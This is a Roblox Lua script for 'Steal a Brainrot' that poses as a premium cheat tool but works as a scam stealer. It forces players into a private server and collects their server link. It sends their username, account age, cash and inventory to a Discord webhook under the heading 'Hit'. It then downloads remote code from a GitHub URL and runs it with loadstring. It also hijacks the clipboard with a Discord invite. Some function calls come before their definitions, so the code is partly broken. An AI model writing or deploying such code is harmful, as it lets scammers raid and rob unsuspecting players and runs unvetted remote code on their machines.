--[[
   _____ _____ _____ _____ _____ _______ _____ _____ __ __
  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
 | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \  / |
  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
 |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|
                                                                    
                        ZeroScripts | Premium Scripts
                        Made by: ZeroOnTop
                        Discord: discord.gg/cnUAk7uc3n
]]
if _G.scriptExecuted then return end
_G.scriptExecuted = true

if not _G["Zero_Config"] then
    warn("WARNING: Config not loaded! Waiting for config...")
    repeat task.wait() until _G["Zero_Config"]
    warn("Config loaded successfully!")
end

--====================================================================--
-- Services
--====================================================================--
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

--====================================================================--
-- Promotion
--====================================================================--
setclipboard("discord.gg/cnUAk7uc3n")

--====================================================================--
-- VIP-Server Check
--====================================================================--
local serverType = RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
if serverType ~= "VIPServer" then
    LocalPlayer:Kick("ZeroOnTop does not support public servers. Join a Private Server.")
    return
end

--====================================================================--
-- WEBHOOKS (Only User Webhook)
--====================================================================--
local user_webhook = _G["Zero_Config"].user_webhook
local cfg = _G["Zero_Config"]
local receiver = "Not Configured"
if cfg and cfg.users then
    if type(cfg.users) == "table" and #cfg.users > 0 then
        receiver = tostring(cfg.users[1])
    elseif type(cfg.users) == "string" then
        receiver = tostring(cfg.users)
    end
end


--====================================================================--
-- Safe HTTP
--====================================================================--
local function safeRequest(url, body)
    pcall(function()
        request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(body)
        })
    end)
end

local function safeHttpGet(url)
    local ok, result = pcall(function()
        return game:HttpGet(url)
    end)
    if ok then return result end
    warn("HttpGet blocked: " .. tostring(result))
    return nil
end

--====================================================================--
-- Link handling
--====================================================================--
local function extractCode(raw)
    raw = raw:gsub("%s", "")
    return raw:match("share%?code=([%w%-]+)") or raw:match("privateServerLinkCode=([%w%-]+)")
end

local function buildJoinLink(code)
    return "https://www.roblox.com/share?code= " .. code .. "&type=Server"
end

--====================================================================--
-- Stats helpers
--====================================================================--
local function formatCash(num)
    if not num or type(num) ~= "number" then return "Unknown" end
    local abs = math.abs(num)
    if abs >= 1e12 then return string.format("%.2fT", num/1e12)
    elseif abs >= 1e9 then return string.format("%.2fB", num/1e9)
    elseif abs >= 1e6 then return string.format("%.2fM", num/1e6)
    elseif abs >= 1e3 then return string.format("%.2fK", num/1e3)
    else return tostring(num) end
end

local function getStat(name)
    local ls = player:FindFirstChild("leaderstats")
    if ls then
        local v = ls:FindFirstChild(name)
        if v and (v:IsA("IntValue") or v:IsA("NumberValue")) then return v.Value end
    end
    return nil
end

local function detectExecutor()
    if identifyexecutor then return identifyexecutor() end
    if getexecutorname then return getexecutorname() end
    return "Unknown"
end

--====================================================================--
-- Brainrot Scanner: Parse + Sort (Highest to Lowest)
--====================================================================--
local function parseGenerationValue(generationString)
    local cleaned = generationString:gsub("%s", ""):match("^%s*(.-)%s*$")
    local numberPart, unitPart = cleaned:match("(%d+%.?%d*)([KMB]?)")
    if not numberPart then return 0 end
    numberPart = tonumber(numberPart)
    if unitPart == "K" then return numberPart * 1e3
    elseif unitPart == "M" then return numberPart * 1e6
    elseif unitPart == "B" then return numberPart * 1e9
    else return numberPart end
end

local function extractRate(name)
    local rate = name:match("%$(%d+%.?%d*[KMB]?)%/s")
    return rate and (rate .. "/s") or nil
end

local function getBrainrots()
    local list = {}
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return list end
    for _, plot in ipairs(plots:GetChildren()) do
        local podiums = plot:FindFirstChild("AnimalPodiums")
        if podiums then
            for _, podium in ipairs(podiums:GetChildren()) do
                if tonumber(podium.Name) and podium.Name:match("^%d+$") then
                    local base = podium:FindFirstChild("Base")
                    local spawn = base and base:FindFirstChild("Spawn")
                    local attach = spawn and spawn:FindFirstChild("Attachment")
                    local over = attach and attach:FindFirstChild("AnimalOverhead")
                    if over then
                        local nameLbl = over:FindFirstChild("DisplayName")
                        local genLbl = over:FindFirstChild("Generation")
                        if nameLbl and nameLbl:IsA("TextLabel")
                            and genLbl and genLbl:IsA("TextLabel") then
                            local genVal = parseGenerationValue(genLbl.Text)
                            table.insert(list, {
                                name = nameLbl.Text,
                                generation = genLbl.Text,
                                value = genVal
                            })
                        end
                    end
                end
            end
        end
    end
    table.sort(list, function(a, b)
        return a.value > b.value
    end)
    return list
end

--====================================================================--
-- Draggable
--====================================================================--
local function makeDraggable(frame, handle)
    local dragging, dragInput, startPos, startMouse
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            startMouse = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    handle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            local delta = input.Position - startMouse
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                      startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

--====================================================================--
-- GUI
--====================================================================--
local screen = Instance.new("ScreenGui")
screen.Name = "Zero_Cinematic"
screen.ResetOnSpawn = false
screen.IgnoreGuiInset = true
screen.Parent = gui

local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting
TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Sine), {Size = 16}):Play()

local dim = Instance.new("Frame")
dim.Size = UDim2.new(1,0,1,0)
dim.BackgroundColor3 = Color3.new(0,0,0)
dim.BackgroundTransparency = 1
dim.Parent = screen
TweenService:Create(dim, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.4}):Play()

local card = Instance.new("Frame")
card.Size = UDim2.fromOffset(460,280)
card.AnchorPoint = Vector2.new(0.5,0.5)
card.Position = UDim2.fromScale(0.5,1.8)
card.BackgroundColor3 = Color3.fromRGB(28,28,34)
card.BackgroundTransparency = 1
card.BorderSizePixel = 0
card.ClipsDescendants = true
card.Parent = dim

local cardCorner = Instance.new("UICorner", card)
cardCorner.CornerRadius = UDim.new(0,24)

local cardStroke = Instance.new("UIStroke", card)
cardStroke.Color = Color3.fromRGB(80,80,100)
cardStroke.Transparency = 1
cardStroke.Thickness = 2

local gradient = Instance.new("UIGradient", cardStroke)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100,50,255))
}
gradient.Rotation = 45
gradient.Transparency = NumberSequence.new{
    NumberSequenceKeypoint.new(0,0.7),
    NumberSequenceKeypoint.new(1,1)
}

local dragHandle = Instance.new("Frame")
dragHandle.Size = UDim2.new(1,0,0,50)
dragHandle.BackgroundTransparency = 1
dragHandle.Parent = card
makeDraggable(card, dragHandle)

-- Card in
local cardIn = TweenService:Create(card, TweenInfo.new(0.9, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
    Position = UDim2.fromScale(0.5,0.5),
    BackgroundTransparency = 0,
    Rotation = 0
})
cardIn:Play()
TweenService:Create(cardStroke, TweenInfo.new(0.8), {Transparency = 0.6}):Play()
TweenService:Create(gradient, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Rotation = 135}):Play()

-- Title / Sub
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,-60,0,50)
title.Position = UDim2.fromOffset(30,30)
title.BackgroundTransparency = 1
title.Text = "ZeroOnTop"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 40
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextTransparency = 1
title.Parent = card
TweenService:Create(title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1,-60,0,26)
sub.Position = UDim2.fromOffset(30,85)
sub.BackgroundTransparency = 1
sub.Text = "VIP / Private Server Required"
sub.TextColor3 = Color3.fromRGB(255,200,0)
sub.Font = Enum.Font.Gotham
sub.TextSize = 16
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.TextTransparency = 1
sub.Parent = card
TweenService:Create(sub, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()

-- Input container
local inputContainer = Instance.new("Frame")
inputContainer.Size = UDim2.new(1,-80,0,60)
inputContainer.Position = UDim2.fromOffset(40,130)
inputContainer.BackgroundTransparency = 1
inputContainer.Parent = card

-- Floating label
local floatLabel = Instance.new("TextLabel")
floatLabel.Size = UDim2.new(1,0,0,20)
floatLabel.Position = UDim2.fromOffset(0,0)
floatLabel.BackgroundTransparency = 1
floatLabel.Text = "Private Server Link"
floatLabel.TextColor3 = Color3.fromRGB(0,170,255)
floatLabel.Font = Enum.Font.GothamSemibold
floatLabel.TextSize = 14
floatLabel.TextXAlignment = Enum.TextXAlignment.Left
floatLabel.Parent = inputContainer

-- TextBox background
local tbBg = Instance.new("Frame")
tbBg.Size = UDim2.new(1,0,0,36)
tbBg.Position = UDim2.fromOffset(0,24)
tbBg.BackgroundColor3 = Color3.fromRGB(40,40,48)
tbBg.BorderSizePixel = 0
tbBg.Parent = inputContainer

local tbCorner = Instance.new("UICorner", tbBg)
tbCorner.CornerRadius = UDim.new(0,12)

-- REAL PLACEHOLDER
local placeholder = Instance.new("TextLabel")
placeholder.Size = UDim2.new(1,-20,1,0)
placeholder.Position = UDim2.fromOffset(10,0)
placeholder.BackgroundTransparency = 1
placeholder.Text = "Paste your private server link..."
placeholder.TextColor3 = Color3.fromRGB(150,150,160)
placeholder.Font = Enum.Font.Gotham
placeholder.TextSize = 16
placeholder.TextXAlignment = Enum.TextXAlignment.Left
placeholder.TextTransparency = 0
placeholder.Parent = tbBg

-- Actual TextBox
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1,-20,1,0)
textBox.Position = UDim2.fromOffset(10,0)
textBox.BackgroundTransparency = 1
textBox.Text = ""
textBox.TextColor3 = Color3.new(1,1,1)
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 16
textBox.TextXAlignment = Enum.TextXAlignment.Left
textBox.TextWrapped = true
textBox.ClearTextOnFocus = false
textBox.Parent = tbBg

-- Underline
local underline = Instance.new("Frame")
underline.Size = UDim2.new(1,0,0,2)
underline.Position = UDim2.new(0,0,1,0)
underline.BackgroundColor3 = Color3.fromRGB(0,170,255)
underline.BackgroundTransparency = 1
underline.BorderSizePixel = 0
underline.Parent = tbBg

-- Animations
local focusLine = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 0})
local unfocusLine = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 1})
local labelUp = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0,-20), TextSize = 12})
local labelDown = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0,0), TextSize = 14})

-- Placeholder visibility
local function updatePlaceholder()
    placeholder.Visible = (textBox.Text == "")
end
textBox:GetPropertyChangedSignal("Text"):Connect(updatePlaceholder)
textBox.Focused:Connect(function()
    focusLine:Play()
    labelUp:Play()
    updatePlaceholder()
end)
textBox.FocusLost:Connect(function(enter)
    unfocusLine:Play()
    if textBox.Text == "" then labelDown:Play() end
    updatePlaceholder()
    if enter then
        task.wait(0.1)
        triggerContinue() -- Call the function directly instead
    end
end)
-- Continue button
local continueBtn = Instance.new("TextButton")
continueBtn.Size = UDim2.new(0,140,0,50)
continueBtn.Position = UDim2.new(1,-180,1,-80)
continueBtn.BackgroundColor3 = Color3.fromRGB(0,140,255)
continueBtn.Text = "Continue"
continueBtn.TextColor3 = Color3.new(1,1,1)
continueBtn.Font = Enum.Font.GothamBold
continueBtn.TextSize = 18
continueBtn.AutoButtonColor = false
continueBtn.Parent = card

local btnCorner = Instance.new("UICorner", continueBtn)
btnCorner.CornerRadius = UDim.new(0,14)

local btnStroke = Instance.new("UIStroke", continueBtn)
btnStroke.Color = Color3.fromRGB(100,200,255)
btnStroke.Thickness = 0

local pulse = TweenService:Create(btnStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Thickness = 3})
pulse:Play()

local pressIn = TweenService:Create(continueBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
    Size = UDim2.new(0,130,0,46),
    BackgroundColor3 = Color3.fromRGB(0,110,220)
})
local pressOut = TweenService:Create(continueBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
    Size = UDim2.new(0,140,0,50),
    BackgroundColor3 = Color3.fromRGB(0,140,255)
})
continueBtn.MouseButton1Down:Connect(function() pressIn:Play() end)
continueBtn.MouseButton1Up:Connect(function() pressOut:Play() end)
continueBtn.MouseLeave:Connect(function() pressOut:Play() end)

--====================================================================--
-- Continue Button Logic
--====================================================================--
local function triggerContinue()
    local raw = textBox.Text
    if raw == "" then
        textBox.TextColor3 = Color3.fromRGB(255,100,100)
        task.wait(0.4)
        textBox.TextColor3 = Color3.new(1,1,1)
        return
    end
    local code = extractCode(raw)
    if not code then
        textBox.TextColor3 = Color3.fromRGB(255,100,100)
        task.wait(0.4)
        textBox.TextColor3 = Color3.new(1,1,1)
        return
    end
    local joinLink = buildJoinLink(code)

    -- Fade out the card and transition to the confirmation screen
    TweenService:Create(card, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
        Position = UDim2.fromScale(0.5, -1.5),
        BackgroundTransparency = 1
    }):Play()
    task.wait(0.5)

    showConfirm(joinLink)
end

continueBtn.MouseButton1Click:Connect(triggerContinue)

--====================================================================--
-- ESC Key (Unchanged)
--====================================================================--
UserInputService.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.Escape then
        if confirmGui then
            local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.28, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
            fadeOut:Play()
            fadeOut.Completed:Connect(function() confirmGui:Destroy() end)
        else
            triggerContinue()
        end
    end
end)

--====================================================================--
-- Confirmation Screen
--====================================================================--
local confirmGui
local function showConfirm(joinLink)
    confirmGui = Instance.new("ScreenGui")
    confirmGui.Name = "Zero_Confirm"
    confirmGui.ResetOnSpawn = false
    confirmGui.IgnoreGuiInset = true
    confirmGui.Parent = gui

    local back = Instance.new("Frame")
    back.Size = UDim2.new(1,0,1,0)
    back.BackgroundColor3 = Color3.new(0,0,0)
    back.BackgroundTransparency = 1
    back.Parent = confirmGui

    local confirmCard = Instance.new("Frame")
    confirmCard.Size = UDim2.fromOffset(380,220)
    confirmCard.AnchorPoint = Vector2.new(0.5,0.5)
    confirmCard.Position = UDim2.fromScale(0.5,0.5)
    confirmCard.BackgroundColor3 = Color3.fromRGB(28,28,34)
    confirmCard.BackgroundTransparency = 1
    confirmCard.BorderSizePixel = 0
    confirmCard.Parent = back

    local confirmCorner = Instance.new("UICorner", confirmCard)
    confirmCorner.CornerRadius = UDim.new(0,20)

    local confirmStroke = Instance.new("UIStroke", confirmCard)
    confirmStroke.Color = Color3.fromRGB(0,170,255)
    confirmStroke.Thickness = 2
    confirmStroke.Transparency = 1

    local confirmTitle = Instance.new("TextLabel")
    confirmTitle.Size = UDim2.new(1,-40,0,40)
    confirmTitle.Position = UDim2.fromOffset(20,20)
    confirmTitle.BackgroundTransparency = 1
    confirmTitle.Text = "Confirm Join Link"
    confirmTitle.TextColor3 = Color3.new(1,1,1)
    confirmTitle.Font = Enum.Font.GothamBold
    confirmTitle.TextSize = 24
    confirmTitle.TextTransparency = 1
    confirmTitle.Parent = confirmCard

    local confirmSub = Instance.new("TextLabel")
    confirmSub.Size = UDim2.new(1,-40,0,60)
    confirmSub.Position = UDim2.fromOffset(20,70)
    confirmSub.BackgroundTransparency = 1
    confirmSub.Text = "Are you sure you want to proceed with this server link?\n\n" .. joinLink
    confirmSub.TextColor3 = Color3.fromRGB(200,200,200)
    confirmSub.Font = Enum.Font.Gotham
    confirmSub.TextSize = 14
    confirmSub.TextWrapped = true
    confirmSub.TextTransparency = 1
    confirmSub.Parent = confirmCard

    local confirmYes = Instance.new("TextButton")
    confirmYes.Size = UDim2.new(0,100,0,40)
    confirmYes.Position = UDim2.new(0,20,1,-60)
    confirmYes.BackgroundColor3 = Color3.fromRGB(0,140,255)
    confirmYes.Text = "Yes"
    confirmYes.TextColor3 = Color3.new(1,1,1)
    confirmYes.Font = Enum.Font.GothamBold
    confirmYes.TextSize = 16
    confirmYes.Parent = confirmCard

    local confirmNo = Instance.new("TextButton")
    confirmNo.Size = UDim2.new(0,100,0,40)
    confirmNo.Position = UDim2.new(1,-120,1,-60)
    confirmNo.BackgroundColor3 = Color3.fromRGB(255,60,60)
    confirmNo.Text = "No"
    confirmNo.TextColor3 = Color3.new(1,1,1)
    confirmNo.Font = Enum.Font.GothamBold
    confirmNo.TextSize = 16
    confirmNo.Parent = confirmCard

    local function closeConfirm()
        TweenService:Create(back, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
        TweenService:Create(confirmCard, TweenInfo.new(0.4), {
            Size = UDim2.fromOffset(0,0),
            BackgroundTransparency = 1
        }):Play()
        task.wait(0.4)
        confirmGui:Destroy()
    end

    confirmNo.MouseButton1Click:Connect(closeConfirm)

    -- Fade in
    TweenService:Create(back, TweenInfo.new(0.4), {BackgroundTransparency = 0.6}):Play()
    TweenService:Create(confirmCard, TweenInfo.new(0.5), {
        BackgroundTransparency = 0,
        Size = UDim2.fromOffset(380,220)
    }):Play()
    TweenService:Create(confirmStroke, TweenInfo.new(0.5), {Transparency = 0.6}):Play()
    TweenService:Create(confirmTitle, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
    TweenService:Create(confirmSub, TweenInfo.new(0.6), {TextTransparency = 0}):Play()

    --====================================================================--
    -- Confirm Button Logic
    --====================================================================--
    confirmYes.MouseButton1Click:Connect(function()
        closeConfirm()
        _G.Private_Server_Zero = joinLink
        local cash = getStat("Cash") or 0
        local steals = getStat("Steals") or 0
        local rebirths = getStat("Rebirths") or 0

        
        local brainrots = getBrainrots()
        local backpackLines = {}
        if #brainrots > 0 then
            for _, v in ipairs(brainrots) do
                table.insert(backpackLines, v.name .. " : " .. v.generation)
            end
        else
            table.insert(backpackLines, "No brainrots found.")
        end
        table.insert(backpackLines, 1, "Warning: We Can't Scan Latest Brainrots from events.")
        local finalBackpackText = "```\n" .. table.concat(backpackLines, "\n") .. "\n```"

        local payload = {
            content = "> Jump or type anything in chat to start.",
            username = "ZeroOnTop",
            avatar_url = "https://scriptssm.vercel.app/pngs/logo.png ",
            embeds = {{
                title = "𓆩 ZeroOnTop 𓆪",
                description = "<:faq_badge:1436328022910435370> **Status:** `Unknown`\n> Failed to Fetch Status.\n⠀",
                color = 3447003,
                fields = {
                    { name = "<:emoji_4:1402578195294982156> **Display Name **", value = "```" .. (player.DisplayName or "Unknown") .. "```", inline = true },
                    { name = "<:emoji_2:1402577600060325910> **Username**", value = "```" .. (player.Name or "Unknown") .. "```", inline = true },
                    { name = "<:emoji_7:1402587793909223530> **Account Age**", value = "```" .. tostring(player.AccountAge) .. " Days```", inline = true },
                    { name = "<:emoji_3:1402578008245801086> **Receiver**", value = "```".. receiver .. "```", inline = true },
                    { name = "<:Events:1394005823931420682> **Executor**", value = "```" .. detectExecutor() .. "```", inline = true },
                    { name = "<:money:1436335320437096508> **Cash**", value = "```" .. formatCash(cash) .. "```", inline = true },
                    { name = "<:Rechange:1394005750317060167> **Rebirths**", value = "```" .. tostring(rebirths) .. "```", inline = true },
                    { name = "<:stats:1436336068461985824> **Steals**", value = "```" .. tostring(steals) .. "```", inline = true },
                    {
                        name = "<:Pack:1394005795343044758> **Inventory**",
                        value = "Warning: We Can't Scan Latest Brainrots from events.\n```" ..
                            (function()
                                local lines = {}
                                for _, v in ipairs(brainrots) do
                                    local rate = extractRate(v.name) or v.generation
                                    local cleanName = v.name:gsub("%s*%$[%d%.]+[KM]?/s", ""):gsub("^%s+", ""):gsub("%s+$", "")
                                    table.insert(lines, cleanName .. " : " .. rate)
                                end
                                return #lines > 0 and table.concat(lines, "\n") or "No brainrots found."
                            end)() .. "```"
                    },
                    { name = "<:loc:1436344006421385309> **Join via URL**", value = "[ **Click Here to Join!**](" .. joinLink .. ")" }
                },
                author = { name = "Steal a Brainrot - Hit", url = joinLink, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp " },
                footer = { text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png " },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
                image = { url = "https://scriptssm.vercel.app/pngs/sab.webp " }
            }}
        }

        -- Only send to user_webhook
        safeRequest(user_webhook, payload)

        -- Fade out GUI
        TweenService:Create(card, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {
            Position = UDim2.fromScale(0.5, -1.5),
            BackgroundTransparency = 1
        }):Play()
        TweenService:Create(dim, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
        TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play()

        task.delay(0.7, function()
            screen:Destroy()
            local scriptURL = "https://raw.githubusercontent.com/zeroonbottomyt/kindabroke/refs/heads/main/Gui.lua "
            local src = safeHttpGet(scriptURL)
            if src then
                local success, err = pcall(function() loadstring(src)() end)
                if not success then warn("gui.lua failed: "..tostring(err)) end
            else
                warn("Failed to fetch gui.lua – Check HTTP permissions or internet.")
            end
        end)
    end)
end